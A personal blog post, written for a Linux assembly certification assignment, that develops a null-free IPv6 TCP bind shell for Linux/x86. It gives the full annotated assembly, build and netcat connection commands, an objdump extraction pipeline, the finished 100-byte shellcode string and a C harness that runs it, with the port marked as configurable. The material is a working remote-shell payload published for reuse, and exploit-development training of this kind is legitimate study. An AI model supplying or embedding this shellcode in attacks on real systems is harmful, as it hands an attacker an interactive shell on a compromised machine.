---
layout: post
title: SHELL_BIND_TCP_IPV6 – LINUX/X86
---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification
* Student ID: SLAE-1233
* Assignment: 1
* Github: [Kartik Durg](https://github.com/kartikdurg)

___

The objective of this assignment is to create a Shell_bind_TCP in Linux/x86 Assembly for which, port number should be easily configurable.

To solve this challenge I found following resources very help full:

1. [Syscalls](http://syscalls.kernelgrok.com/)
2. [UAPI/in.h](https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/in.h)
3. [Socket_Services](https://www.3dbrew.org/wiki/Socket_Services)
4. [The IPv6 sock addr structure](http://osr600doc.xinuos.com/en/SDK_netapi/sockC.TheIPv6sockaddrstructure.html)
5. [inet6_proto](http://www.qnx.com/developers/docs/6.5.0/index.jsp?topic=%2Fcom.qnx.doc.neutrino_lib_ref%2Fi%2Finet6_proto.html)

Before going further, I would like to point out few basic rules a shellcode should obey:

* Null free!!
* A shellcode should be as small as possible because, you may never know the size of memory inside which the shellcode will be inject.
* Register aware – clean up the registers before using them, so that you can reuse those registers and save few bytes to achieve small size shellcode.
* Also, no long jumps.

Here is how a `Shell_bind_TCP` for `IPV6` looks like in C:
___
![Shell_bind_TCP_IPV6](/media/1-tcp-bind-shell-1.jpg)

___

A quick breakdown of above shell developed in C:

* Create socket
* Bind socket to a local port
* Listen for incoming connections
* Accept incoming connection
* Redirect `STDIN`,`STDOUT` and `STDERR` to newly created socket from client.
* Spawn the shell.

Now lets create all the above socket programming module’s in `assembly` by making use of `syscalls`. To achieve this, we need to make use of three registers:

* `0x66` is the number of `socketcall()` as defined in the linux headers.This number should be stored in `EAX` register.
* `/usr/include/linux/net.h` contains the call id of socket functions. Store the call id of a socket that you want to use inside the `EBX` register. ( I will be using SYS_BIND, SYS_LISTEN and SYS_ACCEPT )
* `ECX` should contain pointer to the arguments.

___
![Shell_bind_TCP_IPV6](/media/1-tcp-bind-shell-2.jpg)

___

Now that we are aware of basic rules, registers and socket calls to be used for writing our shellcode, lets jump into the assembly:

```
global _start
section .text

_start:
;IPV6 socket creation 
;int socketcall(int call, unsigned long *args);
;sockfd = socket(int socket_family, int socket_type, int protocol);
push byte 0x66              ;socketcall()
pop eax                     ;EAX=0x2

xor ebx,ebx                 ; zero out ebx

push 0x6                    ; IPPROTO_TCP=6
push 0x1                    ; socket_type=SOCK_STREAM (0x1)
push 0xa                    ; AF_INET6
inc ebx                     ; Define SYS_socket = 1
mov ecx,esp                 ; save pointer (ESP) to socket() args (ECX)
int 0x80
xchg esi,eax                ; socfd stored in esi
xor eax,eax

 ;Bind
;int socketcall(int call, unsigned long *args);
;bind(host_sockfd, (struct sockaddr*) &host_addr, sizeof(host_addr)); 
push DWORD eax              ;x4 dword ipv6 loopback  | EAX contains 0
push DWORD eax
push DWORD eax
push DWORD eax
push eax                    ;sin6_addr = in6addr_any | in6addr_any=::
push WORD 0x5c11            ;sin6_port=4444 | 0x5c11 | Configurable |
push WORD 0x0a              ;AF_INET6
mov ecx,esp                 ;ECX holds pointer to struct sockaddr_in6
push byte 0x1c              ;sizeof(sockaddr_in6) | sockaddr_in6 = 28
push ecx                    ;pointer to host_sockfd
push esi                    ;host_sockfd
mov ecx,esp                 ;ECX points to args
inc ebx                     ;EBX = 0x2 | #define SYS_BIND 2
push byte 0x66              ;socketcall()
pop eax
int 80h

;Listen
;int socketcall(int call, unsigned long *args);
;int listen(int host_sockfd, int backlog);
push ebx                    ;EBX=2 | backlog=2
push esi                    ;poiter to host_sockfd
mov ecx,esp                 ;ECX points to args
inc ebx
inc ebx                     ;EBX = 0x4| #define SYS_LISTEN 4
push byte 0x66              ;socketcall()
pop eax
int 80h

;Accept
;int socketcall(int call, unsigned long *args);
;accept(int sockfd, NULL, NULL);
cdq                         ;EDX = 0x0 | Saves a byte
push edx                    ;Push NULL
push edx                    ;Push NULL
push esi                    ;Push host_sockfd
mov ecx,esp                 ;ECX points to args
inc ebx                     ;EBX = 0x5 | #define SYS_ACCEPT 5
push byte 0x66              ;socketcall()
pop eax
int 80h

xchg ebx,eax                ;save client_sockfd

push byte 0x2               ;push 0x2 on stack
pop ecx                     ;ECX = 2

;dup2() to redirect stdin(0), stdout(1) and stderr(2)
loop:
push byte 0x3f              ;dup2()
pop eax                     ;EAX = 0x3f
int 0x80                    ;exec sys_dup2
dec ecx                     ;decrement counter
jns loop                    ;if SF not set ==> keep jumping

;execve(/bin//sh)
xor ecx,ecx                 ;clear ECX
push ecx                    ;Push NULL
push byte 0x0b              ;execve() sys call number
pop eax                     ;EAX=0x2 | execve()
push 0x68732f2f             ;(1)/bin//sh
push 0x6e69622f             ;(2)/bin//sh
mov ebx,esp                 ;EBX pointing to "/bin//sh"
int 0x80                    ;Calling Interrupt for sys call
```

As you can see, we have `EAX: 0x66 , EBX: 0x1, ECX:{10,1,0}` that will issue a socketcall of type `SYS_SOCKET`. Similarly `0x2` for `SYS_BIND`, `0x4` for `SYS_LISTEN` and `0x5` for `SYS_ACCEPT`.

Moving further to next instruction, `IPPROTO_TCP` is defined by using push `0x6`, `SOCK_STREAM` by using push `0x1` and `AF_INET6` by using push `0xa`. I have used `IPPROTO_TCP` because it supports both `AF_INET` and `AF_INET6` sockets.

___
![Shell_bind_TCP_IPV6](/media/1-tcp-bind-shell-3.jpg)

___

Before calling `bind()`, you can notice that `sin6_addr` is set to `0` by using push `DWORD EAX` and then setting up `::1(localhost)`, port `4444` as below:

* PUSH `EAX`
* PUSH `0x5c11 (Configurable)`

### COMPILING AND CONNECTING TO SHELLCODE:

```
==> nasm -f elf32 -o shell_bind_tcp_ipv6.o shell_bind_tcp_ipv6.asm
==> ld -o shell_bind_tcp_ipv6 shell_bind_tcp_ipv6.o
==> lsof | grep 2863 | grep -i listen
# Connect to 127.0.0.1:4444
==> nc -nv 127.0.0.1 4444
```

___
![Shell_bind_TCP_IPV6](/media/1-tcp-bind-shell-4.jpg)

___


### EXTRACTING THE SHELLCODE:
```
objdump -d shell_bind_tcp_ipv6.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x53\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x99\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```

### SHELLCODE IN C:
```
#include<stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x31\xdb\x6a\x06\x6a\x01\x6a\x0a\x43\x89\xe1\xcd\x80\x96\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x53\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x99\x52\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
printf("Shellcode Length: %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}
```

### TESTING THE FINAL SHELLCODE:
___
![Shell_bind_TCP_IPV6](/media/1-tcp-bind-shell-5.jpg)

___

Objectives achieved:

* Shellcode is null free.
* Only 100 bytes in size.
* Port can be easily configured. ( To configure the port, check the “Configurable” comment in assembly code.)
* Register independent

Exploit-DB: [https://www.exploit-db.com/exploits/45080](https://www.exploit-db.com/exploits/45080)

Link to C-code:
[shell_bind_tcp_ipv6.c](https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x1/shell_bind_tcp_ipv6.c)

Link to Shellcode.ASM:
[shell_bind_tcp_ipv6.asm](https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x1/shell_bind_tcp_ipv6.asm)

Link to Shellcode.c:
[shell_bind_tcp_ipv6_final.c](https://github.com/kartikdurg/SLAE/blob/master/Assignment_0x1/shell_bind_tcp_ipv6_final.c)

Thank you for reading 🙂

– Kartik Durg
